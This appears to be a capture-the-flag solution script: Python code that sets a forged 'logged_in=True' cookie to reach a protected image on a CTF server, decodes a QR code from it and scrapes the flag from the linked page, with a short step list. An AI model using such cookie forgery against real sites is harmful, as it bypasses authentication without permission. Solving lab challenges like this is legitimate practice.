import requests
import cv2
import numpy as np
from bs4 import BeautifulSoup

def scan_qrcode_from_bytes(image_bytes: bytes) -> str:
    """
    Scan a QR code from PNG image bytes using OpenCV.
    
    Args:
        image_bytes (bytes): Bytes of the PNG image containing the QR code.
    
    Returns:
        str: The content of the QR code, or None if not found.
    """
    # Convert bytes to numpy array
    nparr = np.frombuffer(image_bytes, np.uint8)
    
    # Decode the image
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    
    # Create QR code detector
    detector = cv2.QRCodeDetector()
    
    # Decode the QR code
    data, points, _ = detector.detectAndDecode(img)
    
    if data:
        return data
    else:
        return None

# Download the image
url = "http://ctf.ac.upt.ro:9438/images/city/haunts/me/not-a-flag.png"
cookies = {'logged_in': "True"}
r = requests.get(url, cookies=cookies)

# Scan the QR code from the received bytes
result = scan_qrcode_from_bytes(r.content)

# Follow the extracted URL
r = requests.get(result)
ctx = BeautifulSoup(r.text, features='html.parser')
flag = ctx.find("div", class_="de1")

print("Flag:", flag.text)

üß† How this works:

  1. Use the logged_in=True cookie to access protected resources
  2. Download the image containing the QR code
  3. Use OpenCV to detect and decode the QR code
  4. Follow the URL extracted from the QR code
  5. Parse the response to extract the flag
